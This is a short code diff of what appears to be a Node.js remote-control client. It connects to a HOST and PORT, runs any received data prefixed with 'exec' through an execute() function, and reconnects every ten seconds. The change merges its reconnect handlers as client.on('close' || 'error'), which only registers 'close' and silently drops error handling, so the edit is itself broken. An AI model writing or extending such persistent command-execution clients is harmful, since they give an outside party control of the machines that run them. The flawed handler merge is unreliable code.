@@ -37,16 +37,10 @@ client.on("data", (data) => {
 	if (dataStr.startsWith("exec")) execute(dataStr.replace("exec", ""));
 });
 
-client.on("close", () => {
+client.on("close" || "error", () => {
 	setTimeout(() => {
 		connect();
 	}, 10000);
 });
 
-client.on("error", () => {
-	setTimeout(() => {
-		connect();
-	}, 10000);
-});
-
-connect();
+client.connect(PORT, HOST);
